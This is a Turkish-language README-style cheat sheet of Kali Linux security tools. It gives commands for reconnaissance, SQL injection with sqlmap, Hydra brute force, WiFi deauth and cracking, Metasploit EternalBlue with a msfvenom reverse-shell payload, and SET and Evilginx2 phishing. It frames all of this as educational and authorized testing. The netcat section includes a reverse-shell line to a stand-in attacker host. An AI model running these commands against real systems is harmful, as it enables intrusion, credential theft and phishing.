# 🎯 Kali Linux ve Siber Güvenlik Araçları Rehberi

> **Bu proje eğitim amaçlıdır. Tüm araçlar yasal penetration testing ve yetkili güvenlik testleri için kullanılmalıdır.**

---

## 📑 İçindekiler

1. [Keşif Araçları (Reconnaissance)](#keşif-araçları)
2. [Tarama ve Numaralandırma](#tarama-ve-numaralandırma)
3. [Web Uygulama Testleri](#web-uygulama-testleri)
4. [Ağ Güvenliği](#ağ-güvenliği)
5. [Şifre Testleri](#şifre-testleri)
6. [WiFi Testleri](#wifi-testleri)
7. [Exploit Framework'leri](#exploit-frameworkleri)
8. [Forensics ve Analiz](#forensics-ve-analiz)
9. [Sosyal Mühendislik](#sosyal-mühendislik)
10. [Veri Sızıntısı Önleme](#veri-sızıntısı-önleme)

---

## 🔍 Keşif Araçları

### 1. **Nmap** - Port ve Servis Taraması
```bash
# Kurulum
sudo apt install nmap

# Hızlı tarama
nmap 192.168.1.100

# SYN taraması (root gerekli)
sudo nmap -sS 192.168.1.100

# Service versiyonu tespit
nmap -sV 192.168.1.100

# OS tespiti
nmap -O 192.168.1.100

# Tüm portları tara
nmap -p- 192.168.1.100

# UDP taraması
nmap -sU 192.168.1.100

# Agresif tarama
nmap -A 192.168.1.100

# Betikleri çalıştır
nmap --script default 192.168.1.100

# Dosyaya kaydet
nmap -sV -A -O 192.168.1.100 -oN output.txt -oX output.xml
```

### 2. **Mr Holmes** - OSINT Reconnaissance
```bash
# Kurulum
git clone https://github.com/Lucksi/Mr-Holmes.git
cd Mr-Holmes
pip install -r requirements.txt

# Email reconnaissance
python holmes.py -e target@example.com

# Domain bilgisi
python holmes.py -d example.com

# Sosyal medya araştırması
python holmes.py -t target_username
```

### 3. **TheHarvester** - Email ve Subdomain Keşfi
```bash
# Kurulum
apt install theharvester

# Email toplama
theharvester -d example.com -b google

# Subdomain keşfi
theharvester -d example.com -b bing

# Tüm kaynakları kullan
theharvester -d example.com -b all

# Dosyaya kaydet
theharvester -d example.com -b all -f output.html
```

### 4. **Sublist3r** - Subdomain Enumeration
```bash
# Kurulum
git clone https://github.com/aboul3la/Sublist3r.git
cd Sublist3r
pip install -r requirements.txt

# Subdomainleri list
python sublist3r.py -d example.com

# Brute force
python sublist3r.py -d example.com -b

# Thread sayısı ayarla
python sublist3r.py -d example.com -t 100
```

### 5. **Recon-ng** - Gelişmiş Keşif Framework
```bash
# Kurulum
apt install recon-ng

# Başlat
recon-ng

# Komutlar (recon-ng içinde)
marketplace install all
use reconnaissance/domains-subdomains/google_site_index
set SOURCE example.com
run
```

---

## 🎯 Tarama ve Numaralandırma

### 1. **Masscan** - Hızlı Port Tarayıcı
```bash
# Kurulum
apt install masscan

# Hızlı tarama
masscan -p0-65535 192.168.1.0/24

# Belirli portlar
masscan -p 22,80,443,3306 192.168.1.0/24

# IPv6 taraması
masscan -6 2001:db8::/32 -p 80

# Dosyaya kaydet
masscan -p 1-65535 192.168.1.100 > output.txt
```

### 2. **Nikto** - Web Sunucu Taraması
```bash
# Kurulum
apt install nikto

# Temel tarama
nikto -h http://example.com

# Port belirt
nikto -h example.com -p 8080

# SSL taraması
nikto -h https://example.com -ssl

# Dosyaya kaydet
nikto -h example.com -Format csv -o report.csv
```

### 3. **Responder** - LLMNR/NBT-NS Yanıtlayıcı
```bash
# Kurulum
git clone https://github.com/lgandx/Responder.git
cd Responder

# Tüm arayüzleri dinle
python Responder.py -I eth0

# WPAD sunucusu
python Responder.py -I eth0 -w

# DNS logu
python Responder.py -I eth0 -f
```

### 4. **Masscan + Nmap Kombinasyon**
```bash
# Hızlı keşif
masscan -p0-65535 192.168.1.0/24 > open_ports.txt

# Sonuçları Nmap'e gönder
nmap -p22,80,443 192.168.1.0/24 -sV -O
```

---

## 🌐 Web Uygulama Testleri

### 1. **Burp Suite** - Web Proxy ve Tarayıcı
```bash
# Kurulum
apt install burpsuite

# Başlat
burpsuite

# Community Edition
# 1. Proxy sekmesi: 127.0.0.1:8080
# 2. Browser proxy'yi ayarla
# 3. İstekleri yakala ve düzenle
# 4. Scanner koştur
```

### 2. **SQLMap** - SQL Injection Otomasyonu
```bash
# Kurulum
apt install sqlmap

# Basit URL taraması
sqlmap -u "http://example.com/page.php?id=1"

# POST verisi ile
sqlmap -u "http://example.com/login.php" --data="user=admin&pass=pass"

# Tüm veritabanlarını listele
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Tabloları göster
sqlmap -u "http://example.com/page.php?id=1" -D database --tables

# Veri dumpi
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump

# Agresif mod
sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3
```

### 3. **Gobuster** - Dizin ve DNS Brute Force
```bash
# Kurulum
apt install gobuster

# Dizin brute force
gobuster dir -u http://example.com -w wordlist.txt

# DNS brute force
gobuster dns -d example.com -w wordlist.txt

# Alt alan adları
gobuster vhost -u http://example.com -w subdomains.txt

# Hızlı tarama
gobuster dir -u http://example.com -w wordlist.txt -t 100
```

### 4. **dirsearch** - Dizin Keşfi
```bash
# Kurulum
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
python dirsearch.py -u http://example.com -e php,html

# Belirli extension'lar
python dirsearch.py -u http://example.com -e php,html,txt

# Recursive tarama
python dirsearch.py -u http://example.com -r

# Dosyaya kaydet
python dirsearch.py -u http://example.com -o results.txt
```

### 5. **wafw00f** - WAF Tespit
```bash
# Kurulum
apt install wafw00f

# WAF'ı tespit et
wafw00f http://example.com

# Agresif mod
wafw00f -a http://example.com

# Çıktıyı kaydet
wafw00f http://example.com -o report.html
```

### 6. **commix** - Command Injection
```bash
# Kurulum
git clone https://github.com/commixproject/commix.git
cd commix
python commix.py --url="http://example.com/page.php?param=value"

# Cookie ile
python commix.py --url="http://example.com/" --cookie="session=abc123"

# POST datası
python commix.py --url="http://example.com/upload" --data="file=test"

# User-Agent
python commix.py --url="http://example.com/" --user-agent="Mozilla/5.0"
```

### 7. **OWASP ZAP** - Web Uygulama Güvenliği
```bash
# Kurulum
apt install zaproxy

# Başlat
zaproxy

# Komut satırında
zaproxy.sh -cmd -quickurl http://example.com -quickout report.html
```

---

## 🛡️ Ağ Güvenliği

### 1. **Wireshark** - Paket Sniffer ve Analizör
```bash
# Kurulum
apt install wireshark

# GUI başlat
wireshark

# Arayüzü dinle
sudo wireshark -i eth0

# Filtreler
# ip.src == 192.168.1.100
# tcp.port == 80
# http
# dns
```

### 2. **Tcpdump** - Komut Satırı Packet Sniffer
```bash
# Kurulum
apt install tcpdump

# Tüm trafiği yakala
sudo tcpdump

# Belirli arayüzü dinle
sudo tcpdump -i eth0

# Port filtreleme
sudo tcpdump -i eth0 port 80

# IP filtreleme
sudo tcpdump -i eth0 src 192.168.1.100

# Dosyaya kaydet
sudo tcpdump -i eth0 -w capture.pcap

# Dosyadan oku
tcpdump -r capture.pcap
```

### 3. **Tshark** - Terminal Wireshark
```bash
# Kurulum (wireshark paketi içinde)
apt install wireshark

# Trafiği yakala
tshark -i eth0

# Filtre uygula
tshark -i eth0 -f "port 80"

# Dosyaya kaydet
tshark -i eth0 -w output.pcap
```

### 4. **Nessus** - Zafiyet Tarayıcı
```bash
# İndirme (commercial)
# https://www.nessus.com/

# Kurulum
sudo dpkg -i Nessus-10.x.x-debian6_amd64.deb

# Başlat
sudo systemctl start nessusd

# Web arayüzü: https://localhost:8834
```

### 5. **OpenVAS** - Açık Kaynaklı Zafiyet Tarayıcı
```bash
# Kurulum
apt install openvas

# Başlat
sudo systemctl start openvas-scanner
sudo systemctl start openvas-manager

# Web arayüzü: https://localhost:9392
```

---

## 🔐 Şifre Testleri

### 1. **Hydra** - Kimlik Bilgisi Brute Force
```bash
# Kurulum
apt install hydra

# SSH brute force
hydra -l admin -P rockyou.txt 192.168.1.100 ssh

# HTTP POST
hydra -l admin -P rockyou.txt http-post-form://example.com/login.php:user=^USER^&pass=^PASS^:invalid

# FTP
hydra -L users.txt -P pass.txt ftp://192.168.1.100

# SMTP
hydra -L users.txt -P pass.txt smtp://mail.example.com

# RDP
hydra -L users.txt -P pass.txt rdp://192.168.1.100

# Paralel threadsler
hydra -l admin -P rockyou.txt -t 16 192.168.1.100 ssh
```

### 2. **John the Ripper** - Hash Kırma
```bash
# Kurulum
apt install john

# Hash dosyasını kır
john --wordlist=rockyou.txt hashes.txt

# MD5 format
john --format=md5 hashes.txt

# SHA256
john --format=sha256crypt hashes.txt

# Başılmış işleri göster
john --show hashes.txt

# Brute force
john --incremental hashes.txt

# Shadow dosyası
john /etc/shadow
```

### 3. **Hashcat** - GPU Hash Kırma
```bash
# Kurulum
apt install hashcat

# MD5 kırma (mode 0)
hashcat -m 0 hashes.txt rockyou.txt

# SHA256 (mode 1400)
hashcat -m 1400 hashes.txt rockyou.txt

# NTLM (mode 1000)
hashcat -m 1000 hashes.txt rockyou.txt

# bcrypt (mode 3200)
hashcat -m 3200 hashes.txt rockyou.txt

# GPU hızlandırma
hashcat -m 0 -d 1 hashes.txt rockyou.txt

# Tüm hashcat modlerini listele
hashcat -h | grep "Hash mode"
```

### 4. **Aircrack-ng** - WiFi Şifre Kırma
```bash
# Kurulum
apt install aircrack-ng

# Monitor modu aç
sudo airmon-ng start wlan0

# Ağları tara
sudo airodump-ng wlan0mon

# Belirli ağı dinle
sudo airodump-ng -c 6 -bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Handshake yakaladıktan sonra kırma
aircrack-ng -w rockyou.txt capture-01.cap

# Deauth saldırısı (handshake için)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### 5. **Crunch** - Wordlist Oluşturma
```bash
# Kurulum
apt install crunch

# 6 haneli sayılar
crunch 6 6 0123456789 -o wordlist.txt

# Özel karakterler ile
crunch 8 8 abcdef0123456789 -o wordlist.txt

# Permütasyonlar
crunch 3 3 abc -p

# Dosyaya kaydet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha > words.txt
```

---

## 📡 WiFi Testleri

### 1. **Aircrack-ng Suite** - WiFi Güvenlik
```bash
# Monitor modunu başlat
sudo airmon-ng start wlan0

# Ağları tara
sudo airodump-ng wlan0mon

# Belirli ağı dinle ve handshake yakala
sudo airodump-ng -c 6 -bssid 00:11:22:33:44:55 -w capture wlan0mon

# Deauth saldırısı (handshake force)
sudo aireplay-ng -0 100 -a 00:11:22:33:44:55 -c FF:FF:FF:FF:FF:FF wlan0mon

# WPA/WPA2 kırma
aircrack-ng -w rockyou.txt -b 00:11:22:33:44:55 capture-01.cap

# Monitor modunu kapat
sudo airmon-ng stop wlan0mon
```

### 2. **Reaver** - WPS Brute Force
```bash
# Kurulum
apt install reaver

# Pin kırma
sudo reaver -i wlan0 -b 00:11:22:33:44:55 -a

# Belirli kanal
sudo reaver -i wlan0 -b 00:11:22:33:44:55 -c 6 -a

# Yavaş mod
sudo reaver -i wlan0 -b 00:11:22:33:44:55 -d 5 -p3
```

### 3. **PixieWPS** - WPS Offline Kırma
```bash
# Kurulum
git clone https://github.com/wiire-a/pixiewps.git
cd pixiewps
make

# Reaver çıktısından kırma
pixiewps -e SSID -r WPS_PIN -s Password
```

---

## 💣 Exploit Framework'leri

### 1. **Metasploit Framework** - Exploit Framework
```bash
# Kurulum (Kali Linux'te önceden yüklü)
sudo systemctl start postgresql
sudo msfdb init
msfconsole

# İçinde komutlar:
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
run

# Payload oluştur
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
```

### 2. **Empire** - Powershell Exploitation
```bash
# Kurulum
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
sudo ./setup.sh

# Başlat
sudo python empire

# Listener oluştur
listeners
use http
execute
```

### 3. **Shellshock Tester** - Bash Zafiyet
```bash
# Kurulum
git clone https://github.com/nccgroup/shocker.git
cd shocker

# Test et
./shocker.py --url "http://example.com/cgi-bin/test.cgi"
```

---

## 🔬 Forensics ve Analiz

### 1. **Autopsy** - Digital Forensics
```bash
# Kurulum
apt install autopsy

# Başlat
autopsy

# Web arayüzü: http://localhost:9999/autopsy
```

### 2. **Volatility** - Memory Analizi
```bash
# Kurulum
apt install volatility

# Memory dump analizi
volatility -f memory.dump --profile=Win7SP1x64 pslist

# Ağ bağlantıları
volatility -f memory.dump --profile=Win7SP1x64 netscan

# İşlem ağaçları
volatility -f memory.dump --profile=Win7SP1x64 pstree
```

### 3. **Binwalk** - Firmware Analizi
```bash
# Kurulum
apt install binwalk

# Firmware analizi
binwalk firmware.bin

# Dosyaları çıkart
binwalk -e firmware.bin
```

### 4. **Strings** - Metin Arama
```bash
# Kurulum (varsayılan)
strings binary_file | grep password

# Hex dump
xxd binary_file

# Hex editor
hexedit binary_file
```

---

## 🎭 Sosyal Mühendislik

### 1. **The Social Engineer Toolkit (SET)**
```bash
# Kurulum
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
pip install -r requirements.txt
python setoolkit

# Phishing sayfası oluştur
# Seçin: 1 (Social Engineering Attacks)
# Seçin: 2 (Website Attack Vectors)
# Seçin: 3 (Credential Harvester Attack)
```

### 2. **Gophish** - Phishing Framework
```bash
# İndirme
https://github.com/gophish/gophish/releases

# Çalıştır
./gophish

# Web arayüzü: https://localhost:3333
```

### 3. **Evilginx2** - MITM Phishing
```bash
# Kurulum
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Başlat
./evilginx2

# Phishing site
phish
new
```

---

## 🚫 Veri Sızıntısı Önleme (DLP)

### 1. **DLP Tools**
```bash
# Regex ile veri arama
grep -r "password\|secret\|api" . --include="*.py" --include="*.js"

# Git history kontrolü
git log -p | grep -i password

# Hardcoded secrets bul
truffleHog scan --regex
```

### 2. **OWASP Dependency Check**
```bash
# Kurulum
wget https://github.com/jeremylong/DependencyCheck/releases/download/...

# Çalıştır
dependency-check.sh --project "MyApp" --scan /path/to/app
```

### 3. **Semgrep** - Statik Kod Analizi
```bash
# Kurulum
pip install semgrep

# Tarama
semgrep --config=p/owasp-top-ten .

# Dosya taraması
semgrep --config=p/security-audit --json app.py > results.json
```

---

## 🛠️ Ek Faydalı Araçlar

### 1. **curl** - HTTP İstekleri
```bash
# GET isteği
curl http://example.com

# POST isteği
curl -X POST -d "user=admin&pass=pass" http://example.com/login

# Header görüntüle
curl -i http://example.com

# Custom header
curl -H "Authorization: Bearer token" http://example.com

# SSL sertifikası yoksay
curl -k https://example.com
```

### 2. **wget** - Dosya İndirme
```bash
# Dosya indir
wget http://example.com/file.zip

# Recursive indirme
wget -r http://example.com

# Belirli uzantı
wget -r -A "*.pdf" http://example.com
```

### 3. **netcat** - TCP/UDP İletişim
```bash
# Listener başlat
nc -l -p 1234

# Bağlan
nc example.com 1234

# Dosya gönder
cat file.txt | nc example.com 1234

# Reverse shell
nc -e /bin/bash attacker.com 4444
```

### 4. **ss** - Socket İstatistikleri
```bash
# Açık portlar
ss -tlnp

# Ağ bağlantıları
ss -tnp

# Listening portları
ss -ln
```

---

## 📚 Kurulum Komutu (Hepsi)

```bash
#!/bin/bash

# Sistem güncelle
sudo apt update && sudo apt upgrade -y

# Tüm araçları kur
sudo apt install -y \
    nmap \
    masscan \
    nikto \
    netcat-traditional \
    wireshark \
    tcpdump \
    aircrack-ng \
    hashcat \
    john \
    hydra \
    metasploit-framework \
    burpsuite \
    sqlmap \
    gobuster \
    curl \
    wget \
    git \
    python3 \
    python3-pip \
    crunch \
    binwalk \
    volatility \
    autopsy \
    zaproxy \
    openvas \
    theharvester \
    recon-ng

# GitHub araçlarını kur
mkdir ~/security-tools
cd ~/security-tools

git clone https://github.com/Lucksi/Mr-Holmes.git
git clone https://github.com/aboul3la/Sublist3r.git
git clone https://github.com/lgandx/Responder.git
git clone https://github.com/maurosoria/dirsearch.git
git clone https://github.com/enablesecurity/wafw00f.git
git clone https://github.com/commixproject/commix.git
git clone https://github.com/BC-SECURITY/Empire.git
git clone https://github.com/trustedsec/social-engineer-toolkit.git
git clone https://github.com/wiire-a/pixiewps.git

# Python bağımlılıkları
pip install requests beautifulsoup4 paramiko scapy pycryptodome selenium shodan

echo "✓ Tüm araçlar kuruldu!"
```

---

## ⚠️ YASAL UYARLAR

### ✅ Yasallık
- Kendi sistemler üzerinde test
- Yetkili penetration testing
- Eğitim amaçlı kullanım
- Bug bounty programları

### ❌ Yasal Olmayan Kullanım
- İzinsiz sistem erişimi
- Veri hırsızlığı
- DDoS saldırıları
- Kimlik hırsızlığı

---

**Son Güncelleme**: 2026-07-13
**Yazar**: Sibel Güvenlik  
⭐ Faydalı buldum ise star verin!
